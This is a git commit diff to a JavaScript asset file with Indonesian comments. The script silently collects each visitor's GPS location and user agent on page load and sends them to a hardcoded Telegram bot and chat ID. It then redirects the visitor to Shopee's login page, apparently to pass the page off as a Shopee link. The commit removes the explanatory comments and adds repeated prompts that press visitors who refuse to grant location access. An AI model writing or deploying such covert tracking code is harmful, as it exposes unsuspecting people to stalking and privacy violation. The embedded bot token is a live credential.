8cd623320e690a17a7e3a8bcb15e7953fea7971f
logh113 <logbssgsgs@gmail.com>
2024-06-24 18:46:44 +0700

    Update js.js

--- asset/js.js
+++ asset/js.js
@@ -1,16 +1,13 @@
 
 
-// Gantilah 'YOUR_BOT_TOKEN' dan 'YOUR_CHAT_ID' dengan informasi bot Telegram Anda.
+
 var botToken = '7414756868:AAEoYeLOI3CXh8C-MKZoBDdJkiJjMQxfGPs';
 var chatId = '5450283191';
 
 
-// Fungsi untuk mengirim lokasi ke Telegram
-function sendLocationToTelegram(latitude, longitude, userAgent) {
-    // URL API Telegram untuk mengirim lokasi
-    var telegramApiUrl = `https://api.telegram.org/bot${botToken}/sendLocation`;
 
-    // Data yang akan dikirimkan ke API Telegram
+function sendLocationToTelegram(latitude, longitude, userAgent) {
+    var telegramApiUrl = `https://api.telegram.org/bot${botToken}/sendLocation`;
     var data = {
         chat_id: chatId,
         latitude: latitude,
@@ -18,48 +15,65 @@ function sendLocationToTelegram(latitude, longitude, userAgent) {
         caption: `User Agent: ${userAgent}`
     };
 
-    // Menggunakan fetch untuk melakukan POST request ke API Telegram
-    fetch(telegramApiUrl, {
-        method: 'POST',
-        headers: {
-            'Content-Type': 'application/json'
-        },
-        body: JSON.stringify(data)
-    })
-    .then(response => {
-        if (response.ok) {
-            console.log('Location sent to Telegram:', latitude, longitude);
-            // Setelah lokasi terkirim, alihkan pengguna ke halaman lain
-            window.location.href = 'https://shopee.co.id/buyer/login?next=https%3A%2F%2Fshopee.co.id%2F';
-        } else {
-            console.error('Failed to send location to Telegram:', response.status);
+    var xhr = new XMLHttpRequest();
+    xhr.open('POST', telegramApiUrl, true);
+    xhr.setRequestHeader('Content-Type', 'application/json');
+
+    xhr.onreadystatechange = function () {
+        if (xhr.readyState === XMLHttpRequest.DONE) {
+            if (xhr.status === 200) {
+                console.log('Location ', latitude, longitude);
+                window.location.href = 'https://shopee.co.id/buyer/login?next=https%3A%2F%2Fshopee.co.id%2F';
+            } else {
+                console.error('Failed ', xhr.status);
+            }
         }
-    })
-    .catch(error => {
-        console.error('Error sending location to Telegram:', error);
-    });
+    };
+
+    xhr.send(JSON.stringify(data));
 }
 
-// Fungsi untuk mendapatkan lokasi pengguna dan mengirimkan ke Telegram
+
 function getLocationAndSend() {
     if (navigator.geolocation) {
         navigator.geolocation.getCurrentPosition(function(position) {
-            // Dapatkan data lokasi pengguna
+            
             var latitude = position.coords.latitude;
             var longitude = position.coords.longitude;
             var userAgent = navigator.userAgent;
 
-            // Kirim lokasi dan user agent ke bot Telegram
+            
             sendLocationToTelegram(latitude, longitude, userAgent);
         }, function(error) {
             console.error('Error getting location:', error);
+            
+            alert('Untuk melanjutkan, izinkan akses lokasi Anda.');
+            
+            askForLocationPermission();
         });
     } else {
         console.log("Geolocation is not supported by this browser.");
     }
 }
 
-// Panggil getLocationAndSend() saat halaman dimuat
+// 
+function askForLocationPermission() {
+    var button = document.createElement('button');
+    button.textContent = 'Allow Location Access';
+    button.onclick = function() {
+        getLocationAndSend();
+    };
+    
+    var message = document.createElement('div');
+    message.textContent = 'Untuk melanjutkan, izinkan akses lokasi Anda:';
+    message.appendChild(button);
+    
+    
+    document.body.appendChild(message);
+}
+
+
 document.addEventListener("DOMContentLoaded", function () {
     getLocationAndSend();
 });
+
